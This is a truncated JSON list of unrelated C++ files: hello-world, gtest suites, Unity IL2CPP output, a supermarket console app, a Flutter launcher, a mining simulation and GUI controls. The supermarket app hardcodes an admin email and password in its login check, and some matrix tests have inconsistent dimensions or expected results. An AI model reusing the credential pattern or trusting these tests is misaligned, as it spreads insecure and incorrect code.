\" to \" << endDate << \" with amount \" << amount << \" \" << currencyToString(currency)\n              << \" and interest rate \" << interestRate << \" calculated interest: \" << calculateInterest() << std::endl;\n}\n",
    "// Skeleton of a C++ program\r\n\r\n// Library to take input and produce output\r\n//#include<iostream> // This can be used to include specific input-output functionality\r\n\r\n// Include all C++ libraries\r\n#include<bits/stdc++.h> // This is a header file that includes most of the C++ standard libraries\r\nusing namespace std; // This allows us to use names from the standard library without the 'std::' prefix\r\n\r\nint main() {\r\n    // Outputting text to the console\r\n    std::cout << \"Hello World\" << \"\\n\"; // '\\n' is used to insert a new line\r\n    std::cout << \"Hello World\" << std::endl; // std::endl also inserts a new line and flushes the output buffer\r\n    std::cout << \"Hello World\" << \"\\nHello Mars\" << endl; // Multiple outputs in a single statement\r\n\r\n    // Declaring integer variables\r\n    int x, y;\r\n    \r\n    // Taking input from the user\r\n    cin >> x; // Input an integer value and store it in variable x\r\n    cin >> y; // Input another integer value and store it in variable y\r\n    \r\n    // Outputting the values of the variables\r\n    cout << \"Value of x: \" << x << endl; // Print the value of x followed by a new line\r\n    cout << \"Value of y: \" << y; // Print the value of y without a new line\r\n\r\n    return 0; // Indicate that the program ended successfully\r\n}\r\n",
    "#include \"matrix_multiplication.h\"\n#include <iostream>\n#include <vector>\n#include <gtest/gtest.h>\n\n// ######################### Source code of multiplyMatrices in src/matrix_mult\n\n\nTEST(MatrixMultiplicationTest, TestMultiplyMatrices) {\n    std::vector<std::vector<int>> A = {\n        {1, 2, 3},\n        {4, 5, 6}\n    };\n    std::vector<std::vector<int>> B = {\n        {7, 8},\n        {9, 10},\n        {11, 12}\n    };\n    std::vector<std::vector<int>> C(2, std::vector<int>(2, 0));\n\n    multiplyMatrices(A, B, C, 2, 3, 2);\n\n    std::vector<std::vector<int>> expected = {\n        {58, 64},\n        {139, 154}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\n\n\nTEST(MatrixMultiplicationTest, Test1x1) {\n    std::vector<std::vector<int>> A = {\n        {1}\n    };\n    std::vector<std::vector<int>> B = {\n        {9}\n    };\n    std::vector<std::vector<int>> C(1, std::vector<int>(1, 0));\n\n    multiplyMatrices(A, B, C, 1, 1, 1);\n\n    std::vector<std::vector<int>> expected = {\n        {9}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, Test1x1liv2) {\n    std::vector<std::vector<int>> A = {\n        {1}\n    };\n    std::vector<std::vector<int>> B = {\n        {-3}\n    };\n    std::vector<std::vector<int>> C(1, std::vector<int>(1, 0));\n\n    multiplyMatrices(A, B, C, 1, 1, 1);\n\n    std::vector<std::vector<int>> expected = {\n        {-3}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, Test1x1liv3) {\n    std::vector<std::vector<int>> A = {\n        {101}\n    };\n    std::vector<std::vector<int>> B = {\n        {1230}\n    };\n    std::vector<std::vector<int>> C(1, std::vector<int>(1, 0));\n\n    multiplyMatrices(A, B, C, 1, 1, 1);\n\n    std::vector<std::vector<int>> expected = {\n        {124230}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, Test1x1liv4) {\n    std::vector<std::vector<int>> A = {\n        {12}\n    };\n    std::vector<std::vector<int>> B = {\n        {12}\n    };\n    std::vector<std::vector<int>> C(1, std::vector<int>(1, 0));\n\n    multiplyMatrices(A, B, C, 1, 1, 1);\n\n    std::vector<std::vector<int>> expected = {\n        {144}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, Test1x2x1) {\n    std::vector<std::vector<int>> A = {\n        {1,2}\n    };\n    std::vector<std::vector<int>> B = {\n        {3},\n        {4}\n    };\n    std::vector<std::vector<int>> C(1, std::vector<int>(1, 0));\n\n    multiplyMatrices(A, B, C, 1, 2, 1);\n\n    std::vector<std::vector<int>> expected = {\n        {11}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, Test1x2x1liv2) {\n    std::vector<std::vector<int>> A = {\n        {1,2}\n    };\n    std::vector<std::vector<int>> B = {\n        {2},\n        {1}\n    };\n    std::vector<std::vector<int>> C(1, std::vector<int>(1, 0));\n\n    multiplyMatrices(A, B, C, 1, 2, 1);\n\n    std::vector<std::vector<int>> expected = {\n        {4}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, Test1x2x3) {\n    std::vector<std::vector<int>> A = {\n        {9,10}\n    };\n    std::vector<std::vector<int>> B = {\n        {1,2,3},\n        {4,5,6}\n    };\n    std::vector<std::vector<int>> C(1, std::vector<int>(3, 0));\n\n    multiplyMatrices(A, B, C, 1, 2, 1);\n\n    std::vector<std::vector<int>> expected = {\n        {4}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\n\nTEST(MatrixMultiplicationTest, Test2x2x2) {\n    std::vector<std::vector<int>> A = {\n        {1,2},\n        {3,4}\n    };\n    std::vector<std::vector<int>> B = {\n        {5,6},\n        {7,8}\n    };\n    std::vector<std::vector<int>> C(2, std::vector<int>(2, 0));\n\n    multiplyMatrices(A, B, C, 1, 2, 1);\n\n    std::vector<std::vector<int>> expected = {\n        {19,22},\n        {43,50}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, Test2x3x3) {\n    std::vector<std::vector<int>> A = {\n        {0,0},\n        {9,11}\n    };\n    std::vector<std::vector<int>> B = {\n        {0,0,17},\n        {0,0,13}\n    };\n    std::vector<std::vector<int>> C(2, std::vector<int>(3, 0));\n\n    multiplyMatrices(A, B, C, 2, 2, 3);\n\n    std::vector<std::vector<int>> expected = {\n        {0,0,0},\n        {0,0,296}\n    };\n\n    ASSERT_EQ(C, expected) << \"Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, Test2x3x3liv2) {\n    std::vector<std::vector<int>> A = {\n        {-2,0},\n        {0,4}\n    };\n    std::vector<std::vector<int>> B = {\n        {4,0,2},\n        {0,0,0}\n    };\n    std::vector<std::vector<int>> C(2, std::vector<int>(3, 0));\n\n    multiplyMatrices(A, B, C, 2, 2, 3);\n\n    std::vector<std::vector<int>> expected = {\n        {-8,0,-8},\n        {0,0",
    "#include\"gtest.h\"\n#include\"TArrayHash.h\"\nTEST(TArrayHash, can_create_array_hash_table)\n{\n\tusing MyClass = TArrayHash<int, int>;\n\tASSERT_NO_THROW(MyClass ts(););\n}\n\nTEST(TArrayHash, can_create_copied_array_hash_table)\n{\n\tusing MyClass = TArrayHash<int, int>;\n\tMyClass ts(100);\n\tfor (int i = 0; i < 100; i++) {\n\t\tTRecord<int, int>rec(i, i);\n\t\tASSERT_NO_THROW(ts.insert(rec));\n\t}\n\tASSERT_NO_THROW(MyClass ts1(ts););\n}\n\nTEST(TArrayHash, can_assign_array_hash_table)\n{\n\tusing MyClass = TArrayHash<int, int>;\n\tMyClass ts(100);\n\tfor (int i = 0; i < 100; i++) {\n\t\tTRecord<int, int>rec(i, i);\n\t\tASSERT_NO_THROW(ts.insert(rec));\n\t}\n\tMyClass ts1;\n\tASSERT_NO_THROW(ts1 = ts;);\n}\n\n\nTEST(TArrayHash, can_insert_record) {\n\tTArrayHash<int, int> ts(100);\n\tfor (int i = 0; i < 100; i++) {\n\t\tTRecord<int, int>rec(i, i);\n\t\tASSERT_NO_THROW(ts.insert(rec));\n\t}\n}\n\nTEST(TArrayHash, cant_insert_existind_record) {\n\tTArrayHash<int, int> ts(100);\n\tfor (int i = 0; i < 80; i++) {\n\t\tTRecord<int, int>rec(i, i);\n\t\tASSERT_NO_THROW(ts.insert(rec));\n\t}\n\tTRecord<int, int>rec(1, 1);\n\tASSERT_ANY_THROW(ts.insert(rec));\n}\n\nTEST(TArrayHash, can_delete_record) {\n\tTArrayHash<int, int> ts(200);\n\tfor (int i = 0; i < 100; i++) {\n\t\tTRecord<int, int>rec(i, i);\n\t\tASSERT_NO_THROW(ts.insert(rec));\n\t}\n\tint t = 0;\n\tint k = ts.getDataCount();\n\tfor (int i = 0; i < k; i++) {\n\t\tASSERT_NO_THROW(ts.Delete(t));\n\t\tt++;\n\t}\n\tEXPECT_EQ(ts.isEmpty(), 1);\n\tEXPECT_EQ(ts.getDataCount(), 0);\n}\n\nTEST(TArrayHash, can_find_record) {\n\tTArrayHash<int, int> ts(100);\n\tfor (int i = 0; i < 100; i++) {\n\t\tTRecord<int, int>rec(i, i);\n\t\tASSERT_NO_THROW(ts.insert(rec));\n\t}\n\tASSERT_NO_THROW(ts.find(0));\n\tEXPECT_EQ(ts.find(0), 1);\n\tEXPECT_EQ(ts.find(100), 0);\n}",
    "\ufeff#include \"pch-cpp.hpp\"\n\n#ifndef _MSC_VER\n# include <alloca.h>\n#else\n# include <malloc.h>\n#endif\n\n\n#include <limits>\n\n\nstruct VirtualActionInvoker0\n{\n\ttypedef void (*Action)(void*, const RuntimeMethod*);\n\n\tstatic inline void Invoke (Il2CppMethodSlot slot, RuntimeObject* obj)\n\t{\n\t\tconst VirtualInvokeData& invokeData = il2cpp_codegen_get_virtual_invoke_data(slot, obj);\n\t\t((Action)invokeData.methodPtr)(obj, invokeData.method);\n\t}\n};\ntemplate <typename T1>\nstruct VirtualActionInvoker1\n{\n\ttypedef void (*Action)(void*, T1, const RuntimeMethod*);\n\n\tstatic inline void Invoke (Il2CppMethodSlot slot, RuntimeObject* obj, T1 p1)\n\t{\n\t\tconst VirtualInvokeData& invokeData = il2cpp_codegen_get_virtual_invoke_data(slot, obj);\n\t\t((Action)invokeData.methodPtr)(obj, p1, invokeData.method);\n\t}\n};\ntemplate <typename T1>\nstruct InterfaceActionInvoker1\n{\n\ttypedef void (*Action)(void*, T1, const RuntimeMethod*);\n\n\tstatic inline void Invoke (Il2CppMethodSlot slot, RuntimeClass* declaringInterface, RuntimeObject* obj, T1 p1)\n\t{\n\t\tconst VirtualInvokeData& invokeData = il2cpp_codegen_get_interface_invoke_data(slot, obj, declaringInterface);\n\t\t((Action)invokeData.methodPtr)(obj, p1, invokeData.method);\n\t}\n};\n\nstruct Action_1_tB93AB717F9D419A1BEC832FF76E74EAA32184CC1;\nstruct Dictionary_2_tABE19B9C5C52F1DE14F0D3287B2696E7D7419180;\nstruct Func_3_tC721DF8CDD07ED66A4833A19A2ED2302608C906C;\nstruct Func_3_t6F6D9932638EA1A5A45303C6626C818C25D164E5;\nstruct HashSet_1_t4A2F2B74276D0AD3ED0F873045BD61E9504ECAE2;\nstruct IEqualityComparer_1_tDBFC8496F14612776AF930DBF84AFE7D06D1F0E9;\nstruct List_1_t02DF1539DF01B1631C7DD0DE0AD7ACE8839CB2D1;\nstruct List_1_tA239CB83DE5615F348BB0507E45F490F4F7C9A8D;\nstruct List_1_t2147F3FC8B4F16EE577CAF4E40F9D9A684B4CBBD;\nstruct List_1_t4627353295F8415A37CF5B575A1EE871A8174EF0;\nstruct TweenRunner_1_t5BB0582F926E75E2FE795492679A6CF55A4B4BC4;\nstruct SlotU5BU5D_tC4D7CD3E804DC835CCF2F990797BC1D9AE4330D7;\nstruct TMP_TextProcessingStack_1U5BU5D_t08293E0BB072311BB96170F351D1083BCA97B9B2;\nstruct CharU5BU5D_t799905CF001DD5F13F7DBB310181FC4D8B7D0AAB;\nstruct Color32U5BU5D_t38116C3E91765C4C5726CE12C77FAD7F9F737259;\nstruct DecimalU5BU5D_t93BA0C88FA80728F73B792EE1A5199D0C060B615;\nstruct DelegateU5BU5D_tC5AB7E8F745616680F337909D3A8E6C722CDF771;\nstruct FontWeightU5BU5D_t2A406B5BAB0DD0F06E7F1773DB062E4AF98067BA;\nstruct HighlightStateU5BU5D_tA878A0AF1F4F52882ACD29515AADC277EE135622;\nstruct HorizontalAlignmentOptionsU5BU5D_t4D185662282BFB910D8B9A8199E91578E9422658;\nstruct ICanvasElementU5BU5D_t0250CA4AE3428FBA79F891E11BA05D38C35DBEAA;\nstruct Int32U5BU5D_t19C97395396A72ECAF310612F0760F165060314C;\nstruct MaterialU5BU5D_t2B1D11C42DB07A4400C0535F92DBB87A2E346D3D;\nstruct MaterialReferenceU5BU5D_t7491D335AB3E3E13CE9C0F5E931F396F6A02E1F2;\nstruct ObjectU5BU5D_t8061030B0A12A55D5AD8652A20C922FE99450918;\nstruct RichTextTagAttributeU5BU5D_t5816316EFD8F59DBC30B9F88E15828C564E47B6D;\nstruct SingleU5BU5D_t89DEFE97BCEDB5857010E79ECE0F52CF6E93B87C;\nstruct StringU5BU5D_t7674CD946EC0CE7B3AE0BE70E6EE85F2ECD9F248;\nstruct TMP_CharacterInfoU5BU5D_t297D56FCF66DAA99D8FEA7C30F9F3926902C5B99;\nstruct TMP_ColorGradientU5BU5D_t2F65E8C42F268DFF33BB1392D94BCF5B5087308A;\nstruct TMP_TextU5BU5D_t12384CBAF397196B9A7886087BDC8C19D800C24F;\nstruct UInt32U5BU5D_t02FBD658AD156A17574ECE6106CF1FBFCC9807FA;\nstruct Vector2U5BU5D_tFEBBC94BCC6C9C88277BA04047D2B3FDB6ED7FDA;\nstruct Vector3U5BU5D_tFF1859CCE176131B909E2044F76443064254679C;\nstruct WordWrapStateU5BU5D_t473D59C9DBCC949CE72EF1EB471CBA152A6CEAC9;\nstruct UnicodeCharU5BU5D_t67F27D09F8EB28D2C42DFF16FE60054F157012F5;\nstruct CancellationTokenSource_tAAE1E0033BCFC233801F8CB4CED5C852B350CB7B;\nstruct Canvas_t2DB4CEFDFF732884866C83F11ABF75F5AE8FFB26;\nstruct CanvasRenderer_tAB9A55A976C4E3B2B37D0CE5616E5685A8B43860;\nstruct DelegateData_t9B286B493293CD2D23A5B2B5EF0E5B1324C2B77E;\nstruct ICanvasElement_t7F0ABB1280486B82E3267F9C26130FD4AAACAE91;\nstruct ITextPreprocessor_tDBB49C8B68D7B80E8D233B9D9666C43981EFAAB9;\nstruct LayoutElement_tB1F24CC11AF4AA87015C8D8EE06D22349C5BF40A;\nstruct Material_t18053F08F347D0DCA5E1140EC7EC4533DD8A14E3;\nstruct Mesh_t6D9C539763A09BC2B12AEAEF36F6DFFC98AE63D4;\nstruct MethodInfo_t;\nstruct Object_tC12DECB6760A7F2CBF65D9DCF18D044C2D97152C;\nstruct RectMask2D_tACF92BE999C791A665BD1ADEABF5BCEB82846670;\nstruct RectTransform_t6C5DA5E41A89E0F488B001E45E58963480E543A5;\nstruct SerializationInfo_t3C47F63E24BEB9FCE2DC6309E027F238DC5C5E37;\nstruct String_t;\nstruct TMP_Character_t7D37A55EF1A9FF6D0BFE6D50E86A00F80E7FAF35;\nstruct TMP_ColorGradient_t17B51752B4E9499A1FF7D875DCEC1D15A0F4AEBB;\nstruct TMP_FontAsset_t923BF2F78D7C5AC36376E168A1193B7CB4855160;\nstruct TMP_SpriteAnimator_t2E0F016A61CA343E3222FF51E7CF0E53F9F256E4;\nstruct TMP_SpriteAsset_t81F779E6F705CE190DC0D1F93A954CB8B1774B39;\nstruct TMP_Style_tA9E5B1B35EBFE24EF980CEA03251B638282E120C;\nstruct TMP_StyleSheet_t70C71699F5CB2D855C361DBB78A44C901236C859;\nstruct TMP_Text_tE8D677872D43AD4B2AAF0D6101692A17D0B251A9;\nstruct TMP_TextElement_t262A55214F712D4274485ABE5676E5254B84D0A5;\nstruct",
    "#include<bits/stdc++.h>\n\nusing namespace std;\n\nclass shopping\n{\n    private:\n        int pcode;\n        float price;\n        float dis;\n        string pname;\n    public:\n        void menu();\n        void administrator();\n        void buyer();\n        void add();\n        void edit();\n        void rem();\n        void list();\n        void receipt();\n};\n\nvoid shopping::menu()\n{\n    m:\n    int choice;\n    string email;\n    string password;\n\n    cout << \"\\t\\t\\t\\t__________________________\\n\";\n    cout << \"\\t\\t\\t\\t                           \\n\";\n    cout << \"\\t\\t\\t\\t   Supermarket Main Menu   \\n\";\n    cout << \"\\t\\t\\t\\t                           \\n\";\n    cout << \"\\t\\t\\t\\t__________________________\\n\";\n    cout << \"\\t\\t\\t\\t                           \\n\";\n\n    cout << \"\\t\\t\\t\\ |     1) Administrator        |\\n\";\n    cout << \"\\t\\t\\t |                              \\n\";\n    cout << \"\\t\\t\\t\\ |     2) Buyer                |\\n\";\n    cout << \"\\t\\t\\t |                              \\n\";\n    cout << \"\\t\\t\\t\\ |     3) Exit                 |\\n\";\n    cout << \"\\t\\t\\t |                              \\n\";\n    cout << \"\\n\\t\\t\\t Please select: \";\n    cin >> choice;\n\n    switch (choice)\n    {\n    case 1:\n        cout << \"Please Login \\n \";\n        cout << \"Enter Email : \";\n        cin >> email;\n        cout << \"Enter Password : \";\n        cin >> password;\n\n        if (email == \"ank688.ak@gmail.com\" && password == \"ank688.ak@\")\n        {\n            administrator();\n        }\n        else\n        {\n            cout << \"Invalid email/Password !!!\";\n        }\n        break;\n    case 2:\n        buyer();\n        break;\n    case 3:\n        exit(0);\n        break; // Optional, as the program will exit anyway.\n    default:\n        cout << \"Please select from the given options\";\n        break;\n    }\n    goto m;\n}\n\n\nvoid shopping :: administrator()\n{\n    m:\n    int choice;\n    cout << \"\\n\\n\\n\\t\\t\\t Administrator menu\";\n    cout << \"\\n\\t\\t\\t|______1) Add the product_________|\";\n    cout << \"\\n\\t\\t\\t|                                 |\";\n    cout << \"\\n\\t\\t\\t|______2) Modify the product______|\";\n    cout << \"\\n\\t\\t\\t|                                 |\";\n    cout << \"\\n\\t\\t\\t|______3) Delete the product______|\";\n    cout << \"\\n\\t\\t\\t|                                 |\";\n    cout << \"\\n\\t\\t\\t|_____4) Back to the main menu____|\";\n    cout << \"\\n\\t\\t\\t|                                 |\";\n    cout << \"\\n\\t\\t Please enter your choice\";\n    cin >> choice;\n\n    switch(choice)\n    {\n        case 1:\n            add();\n            break;\n        case 2:\n            edit();\n            break;\n        case 3:\n            rem();\n            break;\n        case 4:\n            menu();\n            break;\n        default:\n            cout << \"Invalid choice!\";\n    }\n    goto m;\n}\n\nvoid shopping:: buyer()\n{\n    m:\n    int choice;\n    cout << \"\\t\\t\\t Buyer \\n\";\n    cout << \"               \\n\";\n    cout << \"\\t\\t\\t 1)Buy product \\n\";\n    cout << \"               \\n\";\n    cout << \"\\t\\t\\t 2) Go back \\n\";\n    cout << \"\\t\\t\\t Enter your choice : \\n\";\n\n    cin >> choice;\n\n    switch(choice)\n    {\n        case 1:\n            receipt();\n            break;\n        case 2:\n            menu();\n            break;\n        default:\n            cout << \"Invalid choice\";\n    }\n    goto m;\n}\n\nvoid shopping :: add()\n{\n    m:\n    fstream data;\n    int c;\n    int token = 0;\n    float p;\n    float d;\n    string n;\n\n    cout << \"\\n\\n\\n\\t\\t\\t Product code of the product\";\n    cout << \"\\n\\n\\n\\t\\t\\t Add new Product (Insert Product Code) : \";\n    cin>>pcode;\n    cout << \"\\n\\n\\n\\t\\t\\t Name of the Product : \";\n    cin >> pname;\n    cout << \"\\n\\n\\n\\t\\t\\t Price of the Product : \";\n    cin >> price;\n    cout << \"\\n\\n\\n\\t\\t\\t Discount on product : \";\n    cin >> dis;\n\n    data.open(\"database.txt\",ios::in);    //open it in reading mode\n    if(!data)\n    {\n        data.open(\"database.txt\",ios::app|ios::out);    //out is for writing  //app is for append if data is already there\n        data << \" \"<<pcode<<\" \"<<pname<<\" \"<<price<<\" \"<<dis<<\"\\n\";\n        data.close();\n    }\n    else{\n        data >> c >> n >> p >> d;    //initializing the index\n\n        while(!data.eof())     //eof : end of file hai\n        {\n            if(c == pcode)   //c stands for code, ye hum same item ko likhenge to +1 kardenge token ko\n            {\n                token++;\n            }\n            data >> c >> n >>p >>d;\n        }\n        data.close();\n    }\n\n    if(token==1)\n        goto m;\n    else{\n        data.open(\"database.txt\",ios::app|ios::out);    //out is for writing  //app is for append if data is already there\n        data << \" \"<<pcode<<\" \"<<pname<<\" \"<<price<<\" \"<<dis<<\"\\n\";\n        data.close();\n    }\n    cout << \"\\n\\n\\t\\t Record Inserted !\";\n}\n\nvoid shopping :: edit()\n{\n    fstream data, data1;\n    int pkey;\n    int token=0;\n    int c;\n    float p;\n    float d;\n    string n;\n\n    cout << \"\\n\\t\\t\\t Modify the record\";\n    cout << \"\\n\\t\\t\\t Product code :\";\n    cin >> pkey;\n\n    data.open(\"database.txt\",ios::in);\n   ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"book_api_testing\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include \"server.h\"\n#include <pthread.h>\n#include \"miner.h\"\n#include \"fakeMiner.h\"\n#include \"sched.h\"\n\n#define NUMBERS_OF_MINERS 4\n#define SERVER_PRIORITY 20\n//global print_block\npthread_mutex_t print_lock = PTHREAD_MUTEX_INITIALIZER;\n\nstruct sched_param max_prio = {sched_get_priority_max(SCHED_FIFO)};\nstruct sched_param min_prio = {sched_get_priority_min(SCHED_RR)};\n\nint main(int argc, char *argv[]) {\n    //makeing sure the user puts difficulty number! \n    try {\n        processArguments(argc, argv);\n    } catch (...) //catch any throw..\n    {\n        exit(-1);\n    }\n\n    pthread_attr_t attr_for_server; // Attributes for the server thread \n    sched_param sch_params;\n    pthread_attr_init(&attr_for_server);\n    pthread_attr_setschedpolicy(&attr_for_server, SCHED_FIFO);\n    sch_params.sched_priority = SERVER_PRIORITY;\n\n    pthread_attr_setschedparam(&attr_for_server, &sch_params); //Priority value for the server\n\n    // The fake miner will send wrong blocks every 1 sec.\n    pthread_t server_thread, real_miner[NUMBERS_OF_MINERS], fake_miner_thread;\n\n    auto server = new Server(std::stoi(argv[1])); // 1 server\n    Miner *miners[NUMBERS_OF_MINERS]; // 5 miners -> the 5th is the fake_miner.\n\n    for (int i = 0; i < NUMBERS_OF_MINERS; ++i)\n        miners[i] = new Miner(i + 1, server); //4 normal miners\n\n    auto fake_miner = new fakeMiner(5, server); //1 fake miner\n\n    pthread_create(&server_thread, &attr_for_server, &Server::server_thread_start, server);\n\n    for (int i = 0; i < NUMBERS_OF_MINERS; ++i)\n        pthread_create(&real_miner[i], nullptr, &Miner::miner_thread_start, miners[i]);\n\n    pthread_create(&fake_miner_thread, nullptr, &Miner::miner_thread_start, fake_miner);\n    pthread_join(server_thread, nullptr);\n\n    for (int i = 0; i < NUMBERS_OF_MINERS; ++i)\n        pthread_join(real_miner[i], nullptr);\n\n    pthread_join(fake_miner_thread, nullptr);\n\n    //Delete dynamically allocated objects \n    delete server;\n    delete fake_miner;\n    for (int i = 0; i < NUMBERS_OF_MINERS; ++i)\n        delete miners[i];\n\n    //Clean up thread attributes, mutex and cond.\n    pthread_attr_destroy(&attr_for_server);\n    pthread_mutex_destroy(&print_lock);\n    return 0;\n}\n",
    "#include <QHashIterator>\n#include <QMapIterator>\n\n#include \"joystickcontainer.h\"\n\nJoystickContainer::JoystickContainer(QObject *parent) : QObject(parent)\n{\n    joysticks = new QHash<int, JoystickSDL*>();\n    tempJoyList = new QList<JoystickSDL*>();\n}\n\nvoid JoystickContainer::clearJoysticks()\n{\n    QHashIterator<int, JoystickSDL*> iter(*joysticks);\n    while (iter.hasNext())\n    {\n        iter.next();\n        JoystickSDL* joy = iter.value();\n        delete joy;\n        joy = nullptr;\n    }\n\n    joysticks->clear();\n    emit numPadsChanged(0);\n}\n\nvoid JoystickContainer::establishJoystick(int index, SDL_Joystick *joy)\n{\n    JoystickSDL* tempJoy = new JoystickSDL(index, joy, this);\n    SDL_JoystickID sdlJoyId = static_cast<SDL_JoystickID>(tempJoy->getSDLJoystickID());\n    joysticks->insert(sdlJoyId, tempJoy);\n    emit numPadsChanged(joysticks->count());\n}\n\nQHash<int, JoystickSDL*>* JoystickContainer::getJoysticks()\n{\n    return joysticks;\n}\n\nint JoystickContainer::getNumberJoysticks()\n{\n    return joysticks->count();\n}\n\nJoystickSDL* JoystickContainer::getJoystick(int index)\n{\n    return joysticks->value(index);\n}\n\nJoystickContainer::~JoystickContainer()\n{\n    tempJoyList->clear();\n    delete tempJoyList;\n\n    QHashIterator<int, JoystickSDL*> iter(*joysticks);\n    while (iter.hasNext())\n    {\n        iter.next();\n        JoystickSDL* joy = iter.value();\n        delete joy;\n        joy = nullptr;\n    }\n\n    joysticks->clear();\n    delete joysticks;\n}\n",
    "///////////////////////////////////////////////////////////////////////\r\n///////////////////////////////////////////////////\r\n// SG_PNGView.cpp\r\n// \r\n// Author: Secured Globe, Inc.\r\n//\r\n// E-Mail: info@securedglobe.com\r\n// \r\n// Function: An MFC PNG Picture Control to display\r\n//           a PNG image on a Dialog with transparency.\r\n// \r\n///////////////////////////////////////////////////\r\n///////////////////////////////////////////////////////////////////////\r\n\r\n#include \"pch.h\"\r\n#include \"SG_PNGView.h\"\r\n\r\n#define SGPNGVIEW_CLASSNAME _T(\"SG_PNGView\")  // Window class name\r\n\r\nSG_PNGView::SG_PNGView()\r\n    : m_pBitmap(nullptr)\r\n{\r\n    RegisterWindowClass();\r\n\r\n    GdiplusStartupInput gdiplusStartupInput;\r\n    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);\r\n}\r\n\r\nSG_PNGView::~SG_PNGView()\r\n{\r\n    if (m_pBitmap)\r\n    {\r\n        delete m_pBitmap;\r\n        m_pBitmap = nullptr; // Set pointer to null after deletion\r\n    }\r\n\r\n    if (gdiplusToken)\r\n    {\r\n        GdiplusShutdown(gdiplusToken);\r\n        gdiplusToken = 0; // Reset token value after shutdown\r\n    }\r\n}\r\n\r\n\r\nBEGIN_MESSAGE_MAP(SG_PNGView, CWnd)\r\n    ON_WM_PAINT()\r\nEND_MESSAGE_MAP()\r\n\r\nBOOL SG_PNGView::RegisterWindowClass()\r\n{\r\n    static BOOL bClassRegistered = FALSE;  // Static flag to track if the class is already registered\r\n    if (bClassRegistered)\r\n    {\r\n        // Class is already registered, no need to register it again\r\n        return TRUE;\r\n    }\r\n\r\n    // Get the instance handle of the application\r\n    HINSTANCE hInst = AfxGetInstanceHandle();\r\n    if (!hInst)\r\n    {\r\n        // Instance handle is NULL, unable to register window class\r\n        return FALSE;\r\n    }\r\n\r\n    // Check if the window class is already registered\r\n    WNDCLASS wndcls;\r\n    if (!(::GetClassInfo(hInst, SGPNGVIEW_CLASSNAME, &wndcls)))\r\n    {\r\n        // Window class is not registered, register a new class\r\n        wndcls.style = CS_DBLCLKS | CS_HREDRAW | CS_VREDRAW;\r\n        wndcls.lpfnWndProc = ::DefWindowProc;\r\n        wndcls.cbClsExtra = wndcls.cbWndExtra = 0;\r\n        wndcls.hInstance = hInst;\r\n        wndcls.hIcon = NULL;\r\n        wndcls.hCursor = AfxGetApp()->LoadStandardCursor(IDC_ARROW);\r\n        wndcls.hbrBackground = (HBRUSH)(COLOR_3DFACE + 1);\r\n        wndcls.lpszMenuName = NULL;\r\n        wndcls.lpszClassName = SGPNGVIEW_CLASSNAME;\r\n\r\n        if (!AfxRegisterClass(&wndcls))\r\n        {\r\n            // Failed to register window class\r\n            return FALSE;\r\n        }\r\n    }\r\n\r\n    // Update the flag to indicate that the class is registered\r\n    bClassRegistered = TRUE;\r\n    return TRUE;\r\n}\r\n\r\n// Loads a PNG image from the specified resource ID\r\nStatus SG_PNGView::SetPNGImage(UINT nIDResource)\r\n{\r\n    // Get the instance handle of the application\r\n    HINSTANCE hInstance = AfxGetInstanceHandle();\r\n\r\n    // Find the specified resource in the application's executable file\r\n    HRSRC hResource = ::FindResource(hInstance, MAKEINTRESOURCE(nIDResource), _T(\"PNG\"));\r\n    if (!hResource)\r\n    {\r\n        return GenericError; // Resource not found\r\n    }\r\n\r\n    // Get the size of the resource\r\n    DWORD imageSize = ::SizeofResource(hInstance, hResource);\r\n\r\n    // Get a pointer to the resource data\r\n    const void* pResourceData = ::LockResource(::LoadResource(hInstance, hResource));\r\n    if (!pResourceData)\r\n    {\r\n        return OutOfMemory; // Failed to lock resource\r\n    }\r\n\r\n    // Allocate global memory to hold the resource data\r\n    HGLOBAL hBuffer = ::GlobalAlloc(GMEM_MOVEABLE, imageSize);\r\n    if (!hBuffer)\r\n    {\r\n        return OutOfMemory; // Memory allocation failed\r\n    }\r\n\r\n    // Lock the allocated memory and copy the resource data into it\r\n    void* pBuffer = ::GlobalLock(hBuffer);\r\n    if (!pBuffer)\r\n    {\r\n        ::GlobalFree(hBuffer); // Failed to 